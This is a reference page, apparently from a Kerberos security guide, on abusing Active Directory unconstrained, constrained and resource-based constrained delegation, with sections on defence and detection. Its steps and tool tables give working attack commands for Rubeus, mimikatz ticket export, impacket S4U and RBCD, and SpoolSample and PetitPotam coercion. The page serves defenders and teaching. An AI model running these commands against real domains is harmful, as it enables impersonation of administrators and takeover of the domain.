# Delegation Attacks

Abusing unconstrained, constrained, and resource-based constrained delegation.

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/) Steal or Forge Kerberos Tickets

Kerberos delegation allows a service to act on behalf of a user when accessing other services.
Active Directory implements three delegation models, each with distinct abuse patterns. All three
share a common theme: the attacker leverages a compromised account's delegation privileges to
impersonate other users -- often Domain Admins -- to services they could not otherwise access.

For the protocol mechanics of delegation, see [Delegation](../../protocol/delegation.md).

---

## Unconstrained Delegation

### How It Works

When a user authenticates to a service with unconstrained delegation
(`TRUSTED_FOR_DELEGATION` flag set on the service's account), the KDC sets the `OK-AS-DELEGATE`
flag in the service ticket. Seeing that flag, the client requests a **forwarded TGT** from the
KDC and sends it to the service itself, inside the authenticator of the AP-REQ
([RFC 4121 &sect;4.1.1](https://datatracker.ietf.org/doc/html/rfc4121#section-4.1.1)); the KDC does
not put the TGT in the service ticket. The service extracts this TGT and can use it to
request service tickets to **any** service in the domain, as that user.

This means every user who authenticates to an unconstrained delegation host leaves a copy of
their TGT in the host's LSASS memory.

**The attack:**

1. Compromise a host with unconstrained delegation enabled
2. Extract cached TGTs from LSASS memory
3. Use those TGTs to impersonate any user who authenticated to the host

**The escalation -- authentication coercion:**

Instead of waiting for a high-value user to authenticate, the attacker forces a high-privilege
account (such as a domain controller's computer account) to authenticate to the compromised host.
The coerced authentication delivers the victim's TGT to the attacker.

Common coercion techniques:

| Technique | Protocol | Description |
|---|---|---|
| SpoolSample / PrinterBug | MS-RPRN | Forces a machine to authenticate by triggering the Print Spooler's `RpcRemoteFindFirstPrinterChangeNotification` callback |
| PetitPotam | MS-EFSRPC | Forces a machine to authenticate via the Encrypting File System Remote Protocol (CVE-2021-36942) |
| DFSCoerce | MS-DFSNM | Forces a machine to authenticate via the Distributed File System Namespace Management protocol |

If the coerced machine is a domain controller, the attacker obtains the DC's TGT and can DCSync
the entire domain.

```
Attacker                  Compromised Host           Domain Controller
(controls)                (unconstrained deleg)
   |                           |                           |
   |  1. Trigger coercion      |                           |
   |  (SpoolSample/PetitPotam) |                           |
   |-------------------------->|  2. Force DC to auth      |
   |                           |-------------------------->|
   |                           |                           |
   |                           |  3. DC authenticates      |
   |                           |  (sends forwarded TGT)    |
   |                           |<--------------------------|
   |                           |                           |
   |  4. Extract DC's TGT      |                           |
   |  from LSASS memory        |                           |
   |<--------------------------|                           |
   |                                                       |
   |  5. Use DC's TGT for DCSync                           |
   |------------------------------------------------------>|
```

### Defend

**Remove unnecessary unconstrained delegation:**

```powershell title="Find all accounts with unconstrained delegation"
# Computers with unconstrained delegation (should only return DCs)
Get-ADComputer -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation |
    Select-Object Name, DNSHostName

# User accounts with unconstrained delegation (should return nothing)
Get-ADUser -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation |
    Select-Object Name, DistinguishedName
```

Domain controllers inherently require unconstrained delegation. All other accounts should use
constrained delegation or RBCD instead. The flag can be set on user service accounts as well as
computers, so audit both; [Mitigations](../../security/mitigations.md#unconstrained-delegation)
has a version that excludes domain controllers by primary group.

**Protect high-value accounts:**

- Add Domain Admins and other sensitive accounts to the **Protected Users** group -- members
  cannot be delegated with unconstrained or constrained delegation, so the KDC does not issue
  a forwarded TGT for them and none reaches an unconstrained delegation host
- Mark individual accounts as **"Account is sensitive and cannot be delegated"** in Active
  Directory
- Enable **Credential Guard** on the machines privileged users sign in to. Microsoft documents
  that with it enabled "Kerberos doesn't allow unconstrained Kerberos delegation"
  ([How Credential Guard works](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works))

**Block coercion vectors:**

- Disable the Print Spooler service on all domain controllers:
  `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`
- Install the August 10, 2021 or later updates on domain controllers (CVE-2021-36942, Windows
  LSA Spoofing). Per Microsoft the update "blocks the affected API calls OpenEncryptedFileRawA
  and OpenEncryptedFileRawW through LSARPC interface"; Microsoft says further steps are needed
  and points to [KB5005413](https://support.microsoft.com/help/5005413)
- Restrict authenticated access to coercion-vulnerable RPC interfaces

### Detect

| Event / Signal | Description |
|---|---|
| `Get-ADComputer` / `Get-ADUser` with `-Filter 'TrustedForDelegation -eq $true'` | Periodic audit -- only DCs should appear |
| Event 4624 (type 3) with `Impersonation Level` = `Delegation` | Network logon to an unconstrained delegation host from a high-privilege account. Logged on the host itself (Audit Logon subcategory), not on the domain controller |
| TGT forwarding patterns | Unusual concentration of forwarded TGTs at a single host |
| Coercion indicators | Print Spooler RPC calls or EFSRPC calls from unexpected sources |

---

## Constrained Delegation (S4U2Self + S4U2Proxy) { #constrained }

### How It Works

Constrained delegation limits which services an account can delegate to. The allowed target
services are listed in the `msDS-AllowedToDelegateTo` attribute on the delegating account.

Two S4U (Service for User) extensions power constrained delegation:

**S4U2Self** -- the service requests a service ticket to **itself** on behalf of any user, without
needing that user's TGT. The KDC issues a ticket as if the user had directly requested a service
ticket for the delegating service.

**S4U2Proxy** -- the service presents the S4U2Self ticket (or a forwarded user ticket) to the KDC
and requests a new service ticket to the target service listed in
`msDS-AllowedToDelegateTo`. The KDC validates that the target SPN is in the allowed list
and issues the ticket.

**The attack:**

1. Compromise an account with `msDS-AllowedToDelegateTo` configured
2. Use S4U2Self to get a service ticket to yourself on behalf of any user (e.g., `administrator`)
3. Use S4U2Proxy to forward that ticket to the allowed target service
4. Access the target service as the impersonated user

"Any user" has two limits, both in [MS-SFU &sect;3.2.5.1.2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ad98268b-f75b-42c3-b09b-959282770642).
The KDC must set FORWARDABLE on the S4U2Self ticket when the requesting account has protocol
transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`), and must not set it for an account configured
for "Kerberos only" constrained delegation. And it should not set the flag when the impersonated user
is marked "Account is sensitive and cannot be delegated", which Protected Users membership
implies. Classic constrained delegation requires a forwardable evidence ticket, so in both
cases step 3 fails. See [FORWARDABLE Flag](../../protocol/s4u.md#forwardable-flag).

**SPN substitution:**

The `sname` field in the service ticket is **not protected** by the PAC signature. The SPN in
`msDS-AllowedToDelegateTo` constrains the S4U2Proxy exchange, but after receiving the ticket,
the attacker can modify the `sname` to target a different service on the same host. For example,
if `msDS-AllowedToDelegateTo` contains `HTTP/web.corp.local`, the attacker can change the SPN
to `CIFS/web.corp.local` to access file shares -- because both services run under the same
computer account.

!!! warning "SPN is not a security boundary"
    Constrained delegation to `HTTP/host` effectively grants constrained delegation to
    `CIFS/host`, `LDAP/host`, `HOST/host`, and every other SPN registered to the same account.
    The "constraint" is weaker than it appears.

### Defend

- **Minimize constrained delegation scope** -- only configure `msDS-AllowedToDelegateTo` where
  absolutely required
- **Monitor changes** to `msDS-AllowedToDelegateTo` (Event 5136 for directory service object
  modifications; it needs the audit settings described under [RBCD](#rbcd), Defend)
- **Prefer RBCD** over constrained delegation where possible -- RBCD is configured on the target
  rather than the source, making it easier to audit and manage
- **Use Protected Users** for sensitive accounts -- their tickets cannot be delegated. The
  "Account is sensitive and cannot be delegated" flag has the same effect for a single account

### Detect

| Event / Signal | Description |
|---|---|
| Event 4769 with Transited Services | TGS requests where the `Transited Services` field is populated indicate S4U2Proxy activity. Microsoft defines the field as the "list of SPNs which were requested if constrained Kerberos delegation was used". The same requests have bit 14 (`cname-in-addl-tkt`, mask `0x00020000`) set in `Ticket Options` (bit number from MS-SFU &sect;2.2.3; Microsoft's 4769 flag table labels bit 14 "Request-anonymous"; not captured in this site's lab) |
| Event 5136 | Changes to `msDS-AllowedToDelegateTo` attribute |
| Event 4769 for a ticket to the requester itself | What the S4U2Self step looks like by the documented field definitions: `Account Name` is "the account that requested the ticket" (the service), and the ticket is for that same account. The documented fields include none for the user being impersonated, and `Transited Services` is documented for constrained delegation, not for S4U2Self, so "S4U2Self for a privileged user" cannot be read from 4769 alone. Not captured in this site's lab |

---

## Resource-Based Constrained Delegation (RBCD) { #rbcd }

### How It Works

RBCD inverts the constrained delegation model. Instead of configuring delegation on the
**source** account (`msDS-AllowedToDelegateTo`), RBCD is configured on the **target** account
using the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. This attribute specifies which
accounts are allowed to delegate to the target.

The key difference for attackers: writing `msDS-AllowedToActOnBehalfOfOtherIdentity` only
requires **write access to the target computer object** -- not Domain Admin privileges.

**The attack flow:**

1. **Identify a writable computer object** -- the attacker has write access to a computer account
   in AD (through ACL misconfiguration, account operator privileges, or creator-owner rights)

2. **Create or control a computer account** -- by default, any domain user can create up to 10
   computer accounts (`ms-DS-MachineAccountQuota` default is 10)

    ```bash title="Create a computer account via impacket addcomputer"
    addcomputer.py 'CORP.LOCAL/jsmith:<password>' -computer-name FAKEMACHINE$ -computer-pass '<password>'
    ```

3. **Configure RBCD** -- write the controlled computer account's SID to
   `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer

    ```powershell title="Configure RBCD: allow FAKEMACHINE to delegate to TARGET"
    Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount FAKEMACHINE$
    ```

4. **S4U2Self** -- request a service ticket to the controlled machine on behalf of a target user
   (e.g., `administrator`)

5. **S4U2Proxy** -- present that ticket to the KDC and request a service ticket to the target
   computer's service (e.g., `CIFS/target.corp.local`)

6. **Access the target** as the impersonated user

```
Attacker                        KDC                    Target
   |                             |                       |
   |  1. Create FAKEMACHINE$     |                       |
   |  2. Write RBCD on target    |                       |
   |                             |                       |
   |  3. S4U2Self: ticket to     |                       |
   |     FAKEMACHINE on behalf   |                       |
   |     of administrator        |                       |
   |---------------------------->|                       |
   |  4. S4U2Self ticket         |                       |
   |<----------------------------|                       |
   |                             |                       |
   |  5. S4U2Proxy: forward to   |                       |
   |     CIFS/target.corp.local  |                       |
   |---------------------------->|                       |
   |  6. Service ticket as       |                       |
   |     administrator           |                       |
   |<----------------------------|                       |
   |                                                     |
   |  7. AP-REQ with admin ticket                        |
   |---------------------------------------------------->|
```

### Common Attack Paths

RBCD is often the final step in an attack chain. Common paths that lead to write access on a
computer object:

| Path | How the attacker gets write access |
|---|---|
| Creator-owner | The account that joined a computer to the domain has write access to that computer object by default |
| Account Operators | Members of this group can modify most computer objects |
| ACL misconfiguration | GenericAll, GenericWrite, or WriteDACL on a computer object |
| Compromised admin | Help desk or IT admin accounts with delegated computer management |

### Defend

**Set `ms-DS-MachineAccountQuota` to 0:**

```powershell title="Set ms-DS-MachineAccountQuota to 0 to prevent unprivileged computer account creation"
Set-ADDomain -Identity CORP.LOCAL -Replace @{"ms-DS-MachineAccountQuota" = 0 }
```

This prevents domain users from creating computer accounts, removing the easiest path to a
controlled account for RBCD abuse.

**Monitor RBCD attribute changes:**

Event 5136 logs modifications to directory service objects. Filter for changes to
`msDS-AllowedToActOnBehalfOfOtherIdentity`:

```
Event ID: 5136
Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity
```

!!! warning "Event 5136 needs two things before it is logged"
    The **Audit Directory Service Changes** subcategory must be enabled on domain controllers,
    and, in Microsoft's words, "the modified object must have an appropriate entry in SACL: the
    'Write' action auditing for specific attributes". If the auditing entries (SACL) on the
    computer and user objects do not cover writes to `msDS-AllowedToActOnBehalfOfOtherIdentity`,
    `msDS-AllowedToDelegateTo`, or `servicePrincipalName`, changing those attributes produces no
    5136 event. Verify by making a test change and looking for the event. A change normally
    appears as two events, "Value Deleted" and then "Value Added"; the second one carries the
    new value.

**Protect the accounts worth impersonating:**

Add Domain Admins and other sensitive accounts to **Protected Users** or mark them **"Account
is sensitive and cannot be delegated"**. An S4U2Self ticket for such a user is not forwardable,
and per Microsoft's guidance a domain controller that enforces the CVE-2020-16996 fix does not
allow a non-forwardable ticket to be used for RBCD. Enforcement has been the default since the
March 9, 2021 updates unless the `NonForwardableDelegation` registry value was set to disable it
([Microsoft guidance for CVE-2020-16996](https://support.microsoft.com/en-us/topic/managing-deployment-of-rbcd-protected-user-changes-for-cve-2020-16996-9a59a49f-20b9-a292-f205-da9da0ff24d3)).
Do not count on this to protect accounts that are not marked. For an ordinary user the
specification is not consistent: the KDC rules in
[MS-SFU &sect;3.2.5.2.3](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/dd1b47f9-580c-4c4e-8f34-4485b9728331)
require a forwardable evidence ticket for RBCD, while the client rules in
[MS-SFU &sect;3.1.5.2.1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ddb2cafd-1f01-4834-b52a-d4a5b34cd960)
still allow "a nonforwardable S4U2self-generated user's service ticket for a nonsensitive
user". This site has not tested which rule a current domain controller applies, and the
sensitive-user behavior above is likewise taken from Microsoft's guidance and the
specification, not from the lab; see the box "RBCD and the forwardable flag" under
[FORWARDABLE Flag](../../protocol/s4u.md#forwardable-flag).

**Restrict write access to computer objects:**

- Audit ACLs on computer objects regularly
- Remove unnecessary write permissions from non-admin accounts
- Use the AdminSDHolder + SDProp mechanism to protect sensitive computer accounts

**Monitor computer account creation:**

Event 4741 logs new computer account creation (Audit Computer Account Management subcategory,
on domain controllers). Alert on unexpected computer accounts created by non-admin users.

### Detect

| Event / Signal | Description |
|---|---|
| Event 5136 | Directory service object modification -- filter for `msDS-AllowedToActOnBehalfOfOtherIdentity`. Logged only with Audit Directory Service Changes enabled and a SACL that audits writes to the attribute (see Defend above) |
| Event 4741 | New computer account creation -- alert if the creator is not an expected admin |
| Event 4769 with Transited Services | S4U2Proxy activity for the target computer (also `Ticket Options` bit 14, mask `0x00020000`) (bit number from MS-SFU &sect;2.2.3; Microsoft's 4769 flag table labels bit 14 "Request-anonymous"; not captured in this site's lab) |
| New computer accounts | Unexpected accounts matching patterns like short names or unusual naming conventions |

---

## Tools

!!! info "kerbwolf does not implement delegation attacks"
    Delegation abuse requires S4U protocol extensions and AD object manipulation. kerbwolf focuses
    on the core Kerberos authentication exchanges.

### Unconstrained Delegation

| Tool | Command | Notes |
|---|---|---|
| Rubeus | `Rubeus.exe monitor /interval:5 /nowrap` | Monitors for new TGTs arriving via unconstrained delegation |
| mimikatz | `sekurlsa::tickets /export` | Exports all cached Kerberos tickets including forwarded TGTs |
| SpoolSample | `SpoolSample.exe dc1.corp.local attacker.corp.local` | Triggers PrinterBug coercion |
| PetitPotam | `PetitPotam.py attacker.corp.local dc1.corp.local` | Triggers EFSRPC coercion |

### Constrained Delegation

| Tool | Command | Notes |
|---|---|---|
| Rubeus | `Rubeus.exe s4u /user:svc_web /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/target.corp.local /ptt` | Full S4U2Self + S4U2Proxy chain |
| impacket | `getST.py CORP.LOCAL/svc_web -hashes :<hash> -spn CIFS/target.corp.local -impersonate administrator` | Outputs ccache file |

### RBCD

| Tool | Command | Notes |
|---|---|---|
| impacket | `rbcd.py CORP.LOCAL/jsmith:<password> -delegate-from FAKEMACHINE$ -delegate-to TARGET$ -action write` | Configures RBCD attribute |
| impacket | `getST.py CORP.LOCAL/FAKEMACHINE$:<password> -spn CIFS/target.corp.local -impersonate administrator` | Performs S4U chain after RBCD configuration |
| Rubeus | `Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/target.corp.local /ptt` | S4U chain from controlled computer account |
| PowerView | `Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=...}` | Configures RBCD via PowerShell |
